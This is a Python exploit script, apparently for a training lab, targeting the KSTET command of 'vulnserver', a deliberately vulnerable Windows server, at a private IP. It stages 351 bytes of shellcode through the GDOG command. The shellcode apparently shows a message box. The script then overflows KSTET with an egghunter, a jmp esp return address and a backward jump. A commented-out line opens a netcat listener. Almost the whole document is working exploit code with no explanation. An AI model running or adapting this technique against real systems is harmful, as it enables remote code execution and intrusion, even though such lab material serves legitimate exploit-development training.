#!/usr/bin/python 
import socket 
import os 
import sys
import time

# EIP contains normal pattern : 0x32634131 (offset 65)

# 0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\Administrator\Desktop\vulnserver-master\essfunc.dll)


# [+] Looking for cyclic pattern in memory
#    Cyclic pattern (normal) found at 0x003e5ebb (length 89 bytes)
#    Cyclic pattern (normal) found at 0x00b7f9c7 (length 89 bytes)
#    EIP contains normal pattern : 0x32634131 (offset 65)
#    ESP (0x00b7fa0c) points at offset 69 in normal pattern (length 20)
#    EBP contains normal pattern : 0x63413063 (offset 61)

#Egghunter , tag w00t : 
#"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
#"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
#Put this tag in front of your shellcode : w00tw00t

#jmp_esp =   "\xaf\x11\x50\x62"  # address to overwrite eip 

# jmp_back = "\xeb\xb8\x90\x90" # reverse jmp padded with 2 NOPS 


marker = "w00tw00t" 

buf =  b""
buf += b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
buf += b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
buf += b"\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"
buf += b"\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28"
buf += b"\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34"
buf += b"\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84"
buf += b"\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24"
buf += b"\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b"
buf += b"\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c"
buf += b"\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e"
buf += b"\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e"
buf += b"\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
buf += b"\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68"
buf += b"\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
buf += b"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
buf += b"\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68"
buf += b"\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c"
buf += b"\x24\x0a\x89\xe3\x68\x58\x20\x20\x20\x68\x68\x65\x72"
buf += b"\x65\x68\x57\x61\x73\x20\x68\x6d\x65\x64\x20\x68\x4d"
buf += b"\x6f\x68\x61\x31\xc9\x88\x4c\x24\x10\x89\xe1\x31\xd2"
buf += b"\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff\x55\x08"  # 351 bytes


#shellcode = "C" * 500 

payload1 =  marker +  buf  

egghunter = ("\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30"
"\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7") 

buffer =  egghunter + "A" * (66-len(egghunter))
buffer += "\xAF\x11\x50\x62"  # address to overwrite eip (jmp esp)
buffer += "\xeb\xb8\x90\x90"  # reverse jmp padded with 2 NOPS
buffer += "C" * 2000
payload2 = "KSTET /.:/"  + buffer 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.12",9999))
s.send("GDOG "+payload1)
s.recv(1024)
s.send(payload2)
#os.system("sudo nc -nlvp 443")
#time.sleep(2)
s.close()